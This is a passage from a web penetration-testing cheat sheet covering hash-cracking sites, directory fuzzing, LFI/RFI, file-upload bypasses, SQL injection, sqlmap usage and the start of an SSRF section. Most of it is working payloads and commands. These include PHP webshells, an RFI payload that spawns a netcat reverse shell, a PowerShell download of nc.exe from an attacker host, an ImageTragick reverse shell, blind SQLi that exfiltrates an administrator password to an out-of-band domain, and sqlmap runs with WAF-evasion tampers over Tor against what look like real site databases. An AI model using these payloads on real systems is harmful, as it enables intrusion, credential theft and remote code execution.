https://www.onlinehashcrack.com/
https://gpuhash.me/
https://crackstation.net/
https://crack.sh/
https://hash.help/
https://passwordrecovery.io/
http://cracker.offensive-security.com/
https://md5decrypt.net/en/Sha256/
https://weakpass.com/wordlists
https://hashes.com/en/decrypt/hash
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="crawlfuzz"><a class="header" href="#crawlfuzz">Crawl/Fuzz</a></h1>
<pre><code class="language-bash"># Crawlers
dirhunt https://url.com/
hakrawler -domain https://url.com/
python3 sourcewolf.py -h
gospider -s "https://example.com/" -o output -c 10 -d 1
gospider -S sites.txt -o output -c 10 -d 1
gospider -s "https://example.com/" -o output -c 10 -d 1 --other-source --include-subs

# Fuzzers
# ffuf
# Discover content
ffuf -recursion -mc all -ac -c -e .htm,.shtml,.php,.html,.js,.txt,.zip,.bak,.asp,.aspx,.xml -w six2dez/OneListForAll/onelistforall.txt -u https://url.com/FUZZ
# Headers discover
ffuf -mc all -ac -u https://hackxor.net -w six2dez/OneListForAll/onelistforall.txt -c -H "FUZZ: Hellothereheadertesting123 asd"
# Ffuf - burp
ffuf -replay-proxy http:127.0.0.1:8080
# Fuzzing extensions
# General
.htm,.shtml,.php,.html,.js,.txt,.zip,.bak,.asp,.aspx,.xml,.inc
# Backups
'.bak','.bac','.old','.000','.~','.01','._bak','.001','.inc','.Xxx'

# kr
# https://github.com/assetnote/kiterunner
kr brute https://whatever.com/ -w onelistforallmicro.txt -x 100 --fail-status-codes 404
kr scan https://whatever.com/ -w routes-small.kite -A=apiroutes-210228 -x 100 --ignore-length=34

# chameleon
# https://github.com/iustin24/chameleon
./chameleon -u http://testphp.vulnweb.com -a -A

# Best wordlists for fuzzing:
# https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
    - raft-large-directories-lowercase.txt
    - directory-list-2.3-medium.txt
    - RobotsDisallowed/top10000.txt 
# https://github.com/assetnote/commonspeak2-wordlists/tree/master/wordswithext    - 
# https://github.com/random-robbie/bruteforce-lists
# https://github.com/google/fuzzing/tree/master/dictionaries
# https://github.com/six2dez/OneListForAll
# AIO: https://github.com/foospidy/payloads
# Check https://wordlists.assetnote.io/

# Pro tip: set "Host: localhost" as header
    
# Custom generated dictionary
gau example.com | unfurl -u paths
# Get files only
sed 's#/#\n#g' paths.txt |sort -u
# Other things
gau example.com | unfurl -u keys
gau example.com | head -n 1000 |fff -s 200 -s 404

# Hadrware devices admin panel
# https://github.com/InfosecMatter/default-http-login-hunter
default-http-login-hunter.sh https://10.10.0.1:443/

# Dirsearch
dirsearch -r -f -u https://10.11.1.111 --extensions=htm,html,asp,aspx,txt -w six2dez/OneListForAll/onelistforall.txt --request-by-hostname -t 40

# dirb
dirb http://10.11.1.111 -r -o dirb-10.11.1.111.txt

# wfuzz
wfuzz -c -z file,six2dez/OneListForAll/onelistforall.txt --hc 404 http://10.11.1.11/FUZZ

# gobuster
gobuster dir -u http://10.11.1.111 -w six2dez/OneListForAll/onelistforall.txt -s '200,204,301,302,307,403,500' -e

# Cansina
# https://github.com/deibit/cansina
python3 cansina.py -u example.com -p PAYLOAD

# Ger endpoints from JS
# LinkFinder
# https://github.com/GerbenJavado/LinkFinder
python linkfinder.py -i https://example.com -d
python linkfinder.py -i burpfile -b

# JS enumeration
# https://github.com/KathanP19/JSFScan.sh

# Tip, if 429 add one of these headers:
Client-Ip: IP
X-Client-Ip: IP
X-Forwarded-For: IP
X-Forwarded-For: 127.0.0.1
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="lfirfi"><a class="header" href="#lfirfi">LFI/RFI</a></h1>
<h2 id="tools-3"><a class="header" href="#tools-3">Tools</a></h2>
<pre><code class="language-bash"># https://github.com/kurobeats/fimap
fimap -u "http://10.11.1.111/example.php?test="
# https://github.com/P0cL4bs/Kadimus
./kadimus -u localhost/?pg=contact -A my_user_agent
# https://github.com/wireghoul/dotdotpwn
dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix
# Apache specific: https://github.com/imhunterand/ApachSAL
</code></pre>
<p><strong>How to</strong></p>
<ol>
<li>Look requests with filename like <code>include=main.inc template=/en/sidebar file=foo/file1.txt</code></li>
<li>Modify and test: <code>file=foo/bar/../file1.txt</code> 
<ol>
<li>If the response is the same could be vulnerable</li>
<li>If not there is some kind of block or sanitizer</li>
</ol>
</li>
<li>Try to access world-readable files like <code>/etc/passwd /win.ini</code></li>
</ol>
<h2 id="lfi"><a class="header" href="#lfi">LFI</a></h2>
<pre><code class="language-bash"># Basic LFI
curl -s http://10.11.1.111/gallery.php?page=/etc/passwd

# If LFI, also check
/var/run/secrets/kubernetes.io/serviceaccount

# PHP Filter b64
http://10.11.1.111/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd &amp;&amp; base64 -d savefile.php
http://10.11.1.111/index.php?m=php://filter/convert.base64-encode/resource=config
http://10.11.1.111/maliciousfile.txt%00?page=php://filter/convert.base64-encode/resource=../config.php
# Nullbyte ending
http://10.11.1.111/page=http://10.11.1.111/maliciousfile%00.txt
http://10.11.1.111/page=http://10.11.1.111/maliciousfile.txt%00
# Other techniques
https://abc.redact.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c
https://abc.redact.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd
https://abc.redact.com/static/../../../../../../../../../../../../../../../etc/passwd
https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00
https://abc.redact.com/static//..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.html
https://abc.redact.com/asd.php?file:///etc/passwd
https://abc.redact.com/asd.php?file:///etc/passwd%00
https://abc.redact.com/asd.php?file:///etc/passwd%00.html
https://abc.redact.com/asd.php?file:///etc/passwd%00.ext
https://abc.redact.com/asd.php?file:///..//..//..//..//..//..//..//..//..//..//..//..//..//..//../etc/passwd%00.ext/etc/passwd
https://target.com/admin..;/
https://target.com/../admin
https://target.com/whatever/..;/admin
https://target.com/whatever.php~
# Cookie based
GET /vulnerable.php HTTP/1.1
Cookie:usid=../../../../../../../../../../../../../etc/pasdwd
# LFI Windows
http://10.11.1.111/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00
http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini
http://10.11.1.111/addguestbook.php?LANG=../../../../../../../../../../../../../../../boot.ini
http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00
http://10.11.1.111/addguestbook.php?LANG=/..//..//..//..//..//..//..//..//..//..//..//..//..//..//../boot.ini%00.html
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00.html
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00.html
http://10.11.1.111/addguestbook.php?LANG=file:///C:/boot.ini
http://10.11.1.111/addguestbook.php?LANG=file:///C:/win.ini
http://10.11.1.111/addguestbook.php?LANG=C:\\boot.ini%00.ext
http://10.11.1.111/addguestbook.php?LANG=%SYSTEMROOT%\\win.ini%00.ext

# LFI using video upload:
https://github.com/FFmpeg/FFmpeg
https://hackerone.com/reports/226756
https://hackerone.com/reports/237381
https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit
https://github.com/neex/ffmpeg-avi-m3u-xbin

# Contaminating log files
root@kali:~# nc -v 10.11.1.111 80
10.11.1.111: inverse host lookup failed: Unknown host
(UNKNOWN) [10.11.1.111] 80 (http) open
 &lt;?php echo shell_exec($_GET['cmd']);?&gt; 
http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&amp;cmd=ipconfig

# Common LFI to RCE:
    Using file upload forms/functions
    Using the PHP wrapper expect://command
    Using the PHP wrapper php://file
    Using the PHP wrapper php://filter
    Using PHP input:// stream
    Using data://text/plain;base64,command
    Using /proc/self/environ
    Using /proc/self/fd
    Using log files with controllable input like:
        /var/log/apache/access.log
        /var/log/apache/error.log
        /var/log/vsftpd.log
        /var/log/sshd.log
        /var/log/mail

# LFI possibilities by filetype
    ASP / ASPX / PHP5 / PHP / PHP3: Webshell / RCE
    SVG: Stored XSS / SSRF / XXE
    GIF: Stored XSS / SSRF
    CSV: CSV injection
    XML: XXE
    AVI: LFI / SSRF
    HTML / JS : HTML injection / XSS / Open redirect
    PNG / JPEG: Pixel flood attack (DoS)
    ZIP: RCE via LFI / DoS
    PDF / PPTX: SSRF / BLIND XXE
    
# Chaining with other vulns    
../../../tmp/lol.png —&gt; for path traversal
sleep(10)-- -.jpg —&gt; for SQL injection
&lt;svg onload=alert(document.domain)&gt;.jpg/png —&gt; for XSS
; sleep 10; —&gt; for command injections

# 403 bypasses
/accessible/..;/admin
/.;/admin
/admin;/
/admin/~
/./admin/./
/admin?param
/%2e/admin
/admin#
/secret/
/secret/.
//secret//
/./secret/..
/admin..;/
/admin%20/
/%20admin%20/
/admin%20/page
/%61dmin

# Path Bypasses
# 16-bit Unicode encoding
# double URL encoding
# overlong UTF-8 Unicode encoding
….//
….\/
…./\
….\\
</code></pre>
<h2 id="rfi"><a class="header" href="#rfi">RFI</a></h2>
<pre><code class="language-bash"># RFI:
http://10.11.1.111/addguestbook.php?LANG=http://10.11.1.111:31/evil.txt%00
Content of evil.txt:
&lt;?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?&gt;
# RFI over SMB (Windows)
cat php_cmd.php
    &lt;?php echo shell_exec($_GET['cmd']);?&gt;
# Start SMB Server in attacker machine and put evil script
# Access it via browser (2 request attack):
# http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&amp;cmd=powershell -c Invoke-WebRequest -Uri "http://10.10.14.42/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"
# http://10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&amp;cmd=powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe ATTACKER_IP 1234

# Cross Content Hijacking:
https://github.com/nccgroup/CrossSiteContentHijacking
https://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/
http://50.56.33.56/blog/?p=242

# Encoding scripts in PNG IDAT chunk:
https://yqh.at/scripts_in_pngs.php

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="file-upload"><a class="header" href="#file-upload">File upload</a></h1>
<pre><code># File name validation
    # extension blacklisted:
    PHP: .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
    ASP: .asp, .aspx, .cer, .asa
    Jsp: .jsp, .jspx, .jsw, .jsv, .jspf
    Coldfusion: .cfm, .cfml, .cfc, .dbm
    Using random capitalization: .pHp, .pHP5, .PhAr
    pht,phpt,phtml,php3,php4,php5,php6,php7,phar,pgif,phtm,phps,shtml,phar,pgif,inc
    # extension whitelisted:
    file.jpg.php
    file.php.jpg
    file.php.blah123jpg
    file.php%00.jpg
    file.php\x00.jpg
    file.php%00
    file.php%20
    file.php%0d%0a.jpg
    file.php.....
    file.php/
    file.php.\
    file.
    .html
# Content type bypass
    - Preserve name, but change content-type
    Content-Type: image/jpeg, image/gif, image/png
# Content length:
    # Small bad code:
    &lt;?='$_GET[x]'?&gt;
    
# Impact by extension
asp, aspx, php5, php, php3: webshell, rce
svg: stored xss, ssrf, xxe
gif: stored xss, ssrf
csv: csv injection
xml: xxe
avi: lfi, ssrf
html, js: html injection, xss, open redirect
png, jpeg: pixel flood attack dos
zip: rce via lfi, dos
pdf, pptx: ssrf, blind xxe

# Path traversal
../../etc/passwd/logo.png
../../../logo.png

# SQLi
'sleep(10).jpg
sleep(10)-- -.jpg

# Command injection
; sleep 10;

# ImageTragick
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i &gt;&amp; /dev/tcp/attacker-ip/attacker-port 0&gt;&amp;1|touch "hello)'
pop graphic-context

# XXE .svg
&lt;?xml version="1.0" standalone="yes"?&gt;
&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" &gt; ]&gt;
&lt;svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1
&lt;text font-size="40" x="0" y="16"&gt;&amp;xxe;&lt;/text&gt;
&lt;/svg&gt;

&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"&gt;
&lt;image xlink:href="expect://ls"&gt;&lt;/image&gt;
&lt;/svg&gt;

# XSS svg
&lt;svg onload=alert(document.comain)&gt;.svg
&lt;?xml version="1.0" standalone="no"?&gt;
&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;
File Upload Checklist 3
&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"&gt;
&lt;rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /&gt;
&lt;script type="text/javascript"&gt;
alert("HolyBugx XSS");
&lt;/script&gt;
&lt;/svg&gt;

# Open redirect svg
&lt;code&gt;
&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;svg
onload="window.location='https://attacker.com'"
xmlns="http://www.w3.org/2000/svg"&gt;
&lt;rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /&gt;
&lt;/svg&gt;
&lt;/code&gt;
    
# Filter Bypassing Techniques
# upload asp file using .cer &amp; .asa extension (IIS — Windows)
# Upload .eml file when content-type = text/HTML
# Inject null byte shell.php%001.jpg
# Check for .svg file upload you can achieve stored XSS using XML payload
# put file name ../../logo.png or ../../etc/passwd/logo.png to get directory traversal via upload file
# Upload large size file for DoS attack test using the image.
# (magic number) upload shell.php change content-type to image/gif and start content with GIF89a; will do the job!
# If web app allows for zip upload then rename the file to pwd.jpg bcoz developer handle it via command
# upload the file using SQL command 'sleep(10).jpg you may achieve SQL if image directly saves to DB.

# Advance Bypassing techniques
# Imagetragick aka ImageMagick:
https://mukarramkhalid.com/imagemagick-imagetragick-exploit/
https://github.com/neex/gifoeb
    
# Upload file tool
https://github.com/almandin/fuxploider
python3 fuxploider.py --url https://example.com --not-regex "wrong file type"

https://github.com/sAjibuu/upload_bypass
</code></pre>
<h3 id="cheatsheet"><a class="header" href="#cheatsheet">Cheatsheet</a></h3>
<pre><code>upload.random123		---	To test if random file extensions can be uploaded.
upload.php			---	try to upload a simple php file.
upload.php.jpeg 		--- 	To bypass the blacklist.
upload.jpg.php 			---	To bypass the blacklist. 
upload.php 			---	and Then Change the content type of the file to image or jpeg.
upload.php*			---	version - 1 2 3 4 5 6 7.
upload.PHP			---	To bypass The BlackList.
upload.PhP			---	To bypass The BlackList.
upload.pHp			---	To bypass The BlackList.
upload .htaccess 		--- 	By uploading this [jpg,png] files can be executed as php with milicious code within it.
pixelFlood.jpg			---	To test againt the DOS.
frameflood.gif			---	upload gif file with 10^10 Frames
Malicious zTXT  		--- 	upload UBER.jpg 
Upload zip file			---	test againts Zip slip (only when file upload supports zip file)
Check Overwrite Issue		--- 	Upload file.txt and file.txt with different content and check if 2nd file.txt overwrites 1st file
SVG to XSS			---	Check if you can upload SVG files and can turn them to cause XSS on the target app
SQLi Via File upload		---	Try uploading `sleep(10)-- -.jpg` as file
</code></pre>
<p><img src="enumeration/web/../../.gitbook/assets/image%20(16).png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sqli"><a class="header" href="#sqli">SQLi</a></h1>
<pre><code>https://portswigger.net/web-security/sql-injection/cheat-sheet

https://sqlwiki.netspi.com/#mysql
</code></pre>
<h2 id="common-1"><a class="header" href="#common-1">Common</a></h2>
<pre><code>/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'   &lt;== concat string
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
/?q=(1)or(0)=(1)

# Useful payloads
' WAITFOR DELAY '0:0:5'--
';WAITFOR DELAY '0:0:5'-- 
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
</code></pre>
<h2 id="polyglot"><a class="header" href="#polyglot">Polyglot</a></h2>
<pre><code class="language-sql">', ",'),"), (),., * /, &lt;! -, -
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
</code></pre>
<h2 id="resources-by-type"><a class="header" href="#resources-by-type">Resources by type</a></h2>
<pre><code class="language-bash"># MySQL:
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/

# MSQQL:
http://evilsql.com/main/page2.php
http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

# ORACLE:
http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet

# POSTGRESQL:
http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet

# Others
http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html
http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet
http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet
http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet
https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet
http://rails-sqli.org/
https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
</code></pre>
<h2 id="rw-files"><a class="header" href="#rw-files">R/W files</a></h2>
<pre><code class="language-bash"># Read file
UNION SELECT LOAD_FILE ("etc/passwd")-- 

# Write a file
UNION SELECT "&lt;? system($_REQUEST['cmd']); ?&gt;" INTO OUTFILE "/tmp/shell.php"-
</code></pre>
<h2 id="blind-sqli"><a class="header" href="#blind-sqli"><strong>Blind SQLi</strong></a></h2>
<pre><code class="language-bash"># Conditional Responses

# Request with:
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

    In the DDBB it does:
    SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' - If exists, show content or “Welcome back”

# To detect:
TrackingId=x'+OR+1=1-- OK
TrackingId=x'+OR+1=2-- KO
# User admin exist
TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'-- OK
# Password length
TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)&gt;1--

# So, in the cookie header if first letter of password is greater than ‘m’, or ‘t’ or equal to ‘s’ response will be ok.

xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) &gt; 'm'--
xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) &gt; 't'--
xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) = 's'--
z'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,6,1)='§a§'--

# Force conditional responses

TrackingId=x'+UNION+SELECT+CASE+WHEN+(1=1)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual-- RETURNS ERROR IF OK
TrackingId=x'+UNION+SELECT+CASE+WHEN+(1=2)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+dual-- RETURNS NORMALLY IF KO
TrackingId='+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+substr(password,3,1)='§a§')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--;

# Time delays
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
TrackingId=x'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) &gt; 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
TrackingId=x'; IF (1=2) WAITFOR DELAY '0:0:10'--
TrackingId=x'||pg_sleep(10)--
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

# Out-of-Band OAST (Collaborator)
Asynchronous response

# Confirm:
TrackingId=x'+UNION+SELECT+extractvalue(xmltype('&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//x.burpcollaborator.net/"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--

# Exfil:
TrackingId=x'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
TrackingId=x'+UNION+SELECT+extractvalue(xmltype('&lt;%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual--
</code></pre>
<h2 id="second-order-sqli"><a class="header" href="#second-order-sqli"><strong>Second Order SQLi</strong></a></h2>
<pre><code class="language-bash"># A second-order SQL Injection, on the other hand, is a vulnerability exploitable in two different steps:
1. Firstly, we STORE a particular user-supplied input value in the DB and
2. Secondly, we use the stored value to exploit a vulnerability in a vulnerable function in the source code which constructs the dynamic query of the web application.

# Example payload:
X' UNION SELECT user(),version(),database(), 4 --
X' UNION SELECT 1,2,3,4 --

# For example, in a password reset query with user "User123' --":

$pwdreset = mysql_query("UPDATE users SET password='getrekt' WHERE username='User123' — ' and password='UserPass@123'");

# Will be:

$pwdreset = mysql_query("UPDATE users SET password='getrekt' WHERE username='User123'");

# So you don't need to know the password.

- User = ' or 'asd'='asd it will return always true
- User = admin'-- probably not check the password
</code></pre>
<h2 id="sqlmap"><a class="header" href="#sqlmap"><strong>sqlmap</strong></a></h2>
<pre><code class="language-bash"># Post
sqlmap -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://10.11.1.111/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://10.11.1.111 --dbms=mysql --crawl=3

# Full auto - FORMS
sqlmap -u 'http://10.11.1.111:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
# Columns 
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --columns -T users -D admin
# Values
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --dump -T users -D admin

sqlmap -o -u "http://10.11.1.111:1337/978345210/index.php" --data="username=admin&amp;password=pass&amp;submit=+Login+" --method=POST --level=3 --threads=10 --dbms=MySQL --users --passwords

# SQLMAP WAF bypass

sqlmap --level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
sqlmap --dbms="MySQL" -v3 --technique U --tamper="space2mysqlblank.py" --dbs
sqlmap --dbms="MySQL" -v3 --technique U --tamper="space2comment" --dbs
sqlmap -v3 --technique=T --no-cast --fresh-queries --banner
sqlmap -u http://www.example.com/index?id=1 --level 2 --risk 3 --batch --dbs


sqlmap -f -b --current-user --current-db --is-dba --users --dbs
sqlmap --risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 --dbs
sqlmap --risk 3 --level 5 --random-agent --proxy http://123.57.48.140:8080 --dbs
sqlmap --random-agent --dbms=MYSQL --dbs --technique=B"
sqlmap --identify-waf --random-agent -v 3 --dbs

1 : --identify-waf --random-agent -v 3 --tamper="between,randomcase,space2comment" --dbs
2 : --parse-errors -v 3 --current-user --is-dba --banner -D eeaco_gm -T #__tabulizer_user_preferences --column --random-agent --level=5 --risk=3

sqlmap --threads=10 --dbms=MYSQL --tamper=apostrophemask --technique=E -D joomlab -T anz91_session -C session_id --dump
sqlmap --tables -D miss_db --is-dba --threads="10" --time-sec=10 --timeout=5 --no-cast --tamper=between,modsecurityversioned,modsecurityzeroversioned,charencode,greatest --identify-waf --random-agent
sqlmap -u http://192.168.0.107/test.php?id=1 -v 3 --dbms "MySQL" --technique U -p id --batch --tamper "space2morehash.py"
sqlmap --banner --safe-url=2 --safe-freq=3 --tamper=between,randomcase,charencode -v 3 --force-ssl --dbs --threads=10 --level=2 --risk=2
sqlmap -v3 --dbms="MySQL" --risk=3 --level=3 --technique=BU --tamper="space2mysqlblank.py" --random-agent -D damksa_abr -T admin,jobadmin,member --colu

sqlmap --wizard
sqlmap --level=5 --risk=3 --random-agent --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql
sqlmap -url www.site.ps/index.php --level 5 --risk 3 tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --dbms=mssql
sqlmap -url www.site.ps/index.php --level 5 --risk 3 tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes --dbms=mssql

# Tamper suggester
https://github.com/m4ll0k/Atlas

--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent
--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" --tables
--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" --columns
--tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" -C "ud,email,usuario,contra" --dump
# Tamper list
between.py,charencode.py,charunicodeencode.py,equaltolike.py,greatest.py,multiplespaces.py,nonrecursivereplacement.py,percent
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ssrf"><a class="header" href="#ssrf">SSRF</a></h1>
<h2 id="tools-4"><a class="header" href="#tools-4">Tools</a></h2>
<pre><code class="language-bash"># https://github.com/tarunkant/Gopherus
gopherus --exploit [PLATFORM]
# https://github.com/daeken/SSRFTest
# https://github.com/jmdx/TLS-poison/
# https://github.com/m4ll0k/Bug-Bounty-Toolz
# https://github.com/cujanovic/SSRF-Testing
# https://github.com/bcoles/ssrf_proxy

gau domain.com | python3 ssrf.py collab.listener.com

# https://github.com/micha3lb3n/SSRFire
./ssrfire.sh -d domain.com -s yourserver.com -f /path/to/copied_raw_urls.txt

# SSRF Redirect Payload generator
# https://tools.intigriti.io/redirector/
</code></pre>
<h2 id="summary"><a class="header" href="#summary">Summary</a></h2>
<p>Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems.</p>
<pre><code class="language-bash"># Web requesting other ip or ports like 127.0.0.1:8080 or 192.168.0.1
chat:3000/ssrf?user=&amp;comment=&amp;link=http://127.0.0.1:3000
GET /ssrf?user=&amp;comment=&amp;link=http://127.0.0.1:3000 HTTP/1.1
</code></pre>
<h2 id="ssrf-attacks"><a class="header" href="#ssrf-attacks">SSRF Attacks</a></h2>
<pre><code class="language-bash"># Check if you're able to enum IP or ports
127.0.0.1
127.0.1
127.1
127.000.000.001
2130706433
0x7F.0x00.0x00.0x01
0x7F.1
0x7F000001

# Quick URL based bypasses:
